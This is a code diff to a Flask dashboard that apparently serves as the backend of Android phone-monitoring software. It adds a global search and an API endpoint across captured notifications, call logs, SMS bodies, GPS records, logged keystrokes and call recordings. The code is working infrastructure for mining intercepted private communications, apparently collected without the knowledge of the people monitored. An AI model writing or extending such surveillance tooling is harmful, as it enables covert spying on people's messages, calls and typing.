@@ -9,6 +9,7 @@ Flask application that:
 
 
 import os
+import re
 import time
 from datetime import datetime, timezone, timedelta
 from functools import wraps
@@ -16,6 +17,8 @@ from functools import wraps
 from dotenv import load_dotenv
 from flask import Flask, request, jsonify, render_template, redirect, url_for, session
 from flask_sqlalchemy import SQLAlchemy
+from markupsafe import Markup, escape
+from sqlalchemy import or_, func, desc
 from werkzeug.middleware.proxy_fix import ProxyFix
 
 load_dotenv()
@@ -42,6 +45,22 @@ def to_ist_short_filter(dt, format='%d %b, %I:%M %p'):
         dt = dt.replace(tzinfo=timezone.utc)
     ist_dt = dt.astimezone(IST)
     return ist_dt.strftime(format)
+
+@app.template_filter('highlight')
+def highlight_filter(text, query):
+    if text is None or not query:
+        return escape(str(text or '—'))
+    text_str = str(text)
+    escaped_text = str(escape(text_str))
+    escaped_query = re.escape(str(query).strip())
+    if not escaped_query:
+        return Markup(escaped_text)
+    try:
+        pattern = re.compile(f"({escaped_query})", re.IGNORECASE)
+        highlighted = pattern.sub(r'<mark class="search-highlight">\1</mark>', escaped_text)
+        return Markup(highlighted)
+    except Exception:
+        return Markup(escaped_text)
 
 
 @app.before_request
@@ -861,6 +880,270 @@ def dashboard_gps():
                            current_state=state_filter)
 
 
+def perform_global_search(query_str, device_id=None, category='all', limit_per_category=100):
+    """
+    Perform a case-insensitive LIKE search across all telemetry tables:
+    - Notifications (title, content, app_name, app_package, category, device_id)
+    - Call Logs (phone_number, contact_name, call_type, sim_slot, device_id)
+    - SMS Messages (address, contact_name, body, sms_type, sim_slot, device_id)
+    - Devices (device_id, device_model, android_version, app_version)
+    - GPS Logs (device_id, boolean on/off keywords)
+    - Keystrokes (text, app_name, app_package, device_id)
+    - Call Recordings (phone_number, contact_name, call_type, device_id)
+    """
+    query_str = (query_str or '').strip()
+    results = {
+        'query': query_str,
+        'selected_category': category,
+        'total_count': 0,
+        'counts': {
+            'notifications': 0,
+            'calls': 0,
+            'sms': 0,
+            'devices': 0,
+            'gps': 0,
+            'keystrokes': 0,
+            'recordings': 0
+        },
+        'records': {
+            'notifications': [],
+            'calls': [],
+            'sms': [],
+            'devices': [],
+            'gps': [],
+            'keystrokes': [],
+            'recordings': []
+        }
+    }
+
+    if not query_str:
+        return results
+
+    pattern = f"%{query_str}%"
+
+    # 1. Notifications
+    nq = Notification.query
+    if device_id:
+        nq = nq.filter(Notification.device_id == device_id)
+    nq = nq.filter(or_(
+        Notification.title.ilike(pattern),
+        Notification.content.ilike(pattern),
+        Notification.app_name.ilike(pattern),
+        Notification.app_package.ilike(pattern),
+        Notification.category.ilike(pattern),
+        Notification.device_id.ilike(pattern)
+    ))
+    results['counts']['notifications'] = nq.count()
+    if category in ['all', 'notifications']:
+        results['records']['notifications'] = nq.order_by(Notification.received_at.desc()).limit(limit_per_category).all()
+
+    # 2. Call Logs
+    cq = CallLog.query
+    if device_id:
+        cq = cq.filter(CallLog.device_id == device_id)
+    cq = cq.filter(or_(
+        CallLog.phone_number.ilike(pattern),
+        CallLog.contact_name.ilike(pattern),
+        CallLog.call_type.ilike(pattern),
+        CallLog.sim_slot.ilike(pattern),
+        CallLog.device_id.ilike(pattern)
+    ))
+    results['counts']['calls'] = cq.count()
+    if category in ['all', 'calls']:
+        results['records']['calls'] = cq.order_by(CallLog.occurred_at.desc()).limit(limit_per_category).all()
+
+    # 3. SMS Messages
+    sq = SmsMessage.query
+    if device_id:
+        sq = sq.filter(SmsMessage.device_id == device_id)
+    sq = sq.filter(or_(
+        SmsMessage.address.ilike(pattern),
+        SmsMessage.contact_name.ilike(pattern),
+        SmsMessage.body.ilike(pattern),
+        SmsMessage.sms_type.ilike(pattern),
+        SmsMessage.sim_slot.ilike(pattern),
+        SmsMessage.device_id.ilike(pattern)
+    ))
+    results['counts']['sms'] = sq.count()
+    if category in ['all', 'sms']:
+        results['records']['sms'] = sq.order_by(SmsMessage.occurred_at.desc()).limit(limit_per_category).all()
+
+    # 4. Active Devices / Nodes
+    dq = Device.query
+    if device_id:
+        dq = dq.filter(Device.device_id == device_id)
+    dq = dq.filter(or_(
+        Device.device_id.ilike(pattern),
+        Device.device_model.ilike(pattern),
+        Device.android_version.ilike(pattern),
+        Device.app_version.ilike(pattern)
+    ))
+    results['counts']['devices'] = dq.count()
+    if category in ['all', 'devices']:
+        results['records']['devices'] = dq.order_by(Device.last_ping.desc().nullslast()).limit(limit_per_category).all()
+
+    # 5. GPS Logs
+    gps_conditions = [GpsLog.device_id.ilike(pattern)]
+    lower_q = query_str.lower()
+    if lower_q in ['gps on', 'on', 'enabled', 'true']:
+        gps_conditions.append(GpsLog.is_enabled.is_(True))
+    elif lower_q in ['gps off', 'off', 'disabled', 'false']:
+        gps_conditions.append(GpsLog.is_enabled.is_(False))
+
+    gq = GpsLog.query
+    if device_id:
+        gq = gq.filter(GpsLog.device_id == device_id)
+    gq = gq.filter(or_(*gps_conditions))
+    results['counts']['gps'] = gq.count()
+    if category in ['all', 'gps']:
+        results['records']['gps'] = gq.order_by(GpsLog.occurred_at.desc()).limit(limit_per_category).all()
+
+    # 6. Keystrokes (Phase 2 model)
+    try:
+        kq = Keystroke.query
+        if device_id:
+            kq = kq.filter(Keystroke.device_id == device_id)
+        kq = kq.filter(or_(
+            Keystroke.text.ilike(pattern),
+            Keystroke.app_name.ilike(pattern),
+            Keystroke.app_package.ilike(pattern),
+            Keystroke.device_id.ilike(pattern)
+        ))
+        results['counts']['keystrokes'] = kq.count()
+        if category in ['all', 'keystrokes']:
+            results['records']['keystrokes'] = kq.order_by(Keystroke.captured_at.desc()).limit(limit_per_category).all()
+    except Exception:
+        pass
+
+    # 7. Call Recordings (Phase 2 model)
+    try:
+        rq = CallRecording.query
+        if device_id:
+            rq = rq.filter(CallRecording.device_id == device_id)
+        rq = rq.filter(or_(
+            CallRecording.phone_number.ilike(pattern),
+            CallRecording.contact_name.ilike(pattern),
+            CallRecording.call_type.ilike(pattern),
+            CallRecording.device_id.ilike(pattern)
+        ))
+        results['counts']['recordings'] = rq.count()
+        if category in ['all', 'recordings']:
+            results['records']['recordings'] = rq.order_by(CallRecording.recorded_at.desc()).limit(limit_per_category).all()
+    except Exception:
+        pass
+
+    results['total_count'] = sum(results['counts'].values())
+    return results
+
+
+@app.route('/dashboard/search')
+@require_login
+def dashboard_search():
+    """Universal case-insensitive search across all tables."""
+    query_str = request.args.get('q', '').strip()
+    category = request.args.get('type', 'all')
+    device_filter = session.get('selected_device_id')
+
+    url_device = request.args.get('device')
+    if url_device:
+        if url_device in ['all', '']:
+            device_filter = None
+        else:
+            device_filter = url_device
+
+    search_data = perform_global_search(query_str, device_id=device_filter, category=category)
+    devices = Device.query.order_by(Device.last_ping.desc().nullslast()).all()
+    device_map = {d.device_id: d.device_model or d.device_id for d in devices}
+
+    return render_template(
+        'search.html',
+        query=query_str,
+        category=category,
+        search_data=search_data,
+        devices=devices,
+        device_map=device_map,
+        current_device=device_filter
+    )
+
+
+@app.route('/api/v1/search', methods=['GET'])
+def api_search():
+    """API endpoint for cross-table case-insensitive search."""
+    key = request.headers.get('X-API-Key')
+    if (not key or key != get_api_key()) and not session.get('logged_in'):
+        return jsonify({'error': 'unauthorized'}), 401
+
+    query_str = request.args.get('q', '').strip()
+    category = request.args.get('type', 'all')
+    device_id = request.args.get('device_id')
+    limit = min(request.args.get('limit', 50, type=int), 200)
+
+    if not query_str:
+        return jsonify({
+            'query': '',
+            'total_results': 0,
+            'counts': {},
+            'results': {}
+        })
+
+    search_data = perform_global_search(query_str, device_id=device_id, category=category, limit_per_category=limit)
+
+    serialized_results = {
+        'notifications': [{
+            'id': n.id,
+            'device_id': n.device_id,
+            'app_package': n.app_package,
+            'app_name': n.app_name,
+            'title': n.title,
+            'content': n.content,
+            'category': n.category,
+            'received_at': n.received_at.isoformat() if n.received_at else None
+        } for n in search_data['records']['notifications']],
+        'calls': [{
+            'id': c.id,
+            'device_id': c.device_id,
+            'phone_number': c.phone_number,
+            'contact_name': c.contact_name,
+            'call_type': c.call_type,
+            'duration_sec': c.duration_sec,
+            'sim_slot': c.sim_slot,
+            'occurred_at': c.occurred_at.isoformat() if c.occurred_at else None
+        } for c in search_data['records']['calls']],
+        'sms': [{
+            'id': s.id,
+            'device_id': s.device_id,
+            'address': s.address,
+            'contact_name': s.contact_name,
+            'body': s.body,
+            'sms_type': s.sms_type,
+            'sim_slot': s.sim_slot,
+            'occurred_at': s.occurred_at.isoformat() if s.occurred_at else None
+        } for s in search_data['records']['sms']],
+        'devices': [{
+            'device_id': d.device_id,
+            'device_model': d.device_model,
+            'android_version': d.android_version,
+            'app_version': d.app_version,
+            'battery_level': d.battery_level,
+            'is_charging': d.is_charging,
+            'is_online': d.is_online,
+            'last_ping': d.last_ping.isoformat() if d.last_ping else None
+        } for d in search_data['records']['devices']],
+        'gps': [{
+            'id': g.id,
+            'device_id': g.device_id,
+            'is_enabled': g.is_enabled,
+            'occurred_at': g.occurred_at.isoformat() if g.occurred_at else None
+        } for g in search_data['records']['gps']]
+    }
+
+    return jsonify({
+        'query': query_str,
+        'category': category,
+        'total_results': search_data['total_count'],
+        'counts': search_data['counts'],
+        'results': serialized_results
+    })
 
 
 @app.route('/api/v1/export')
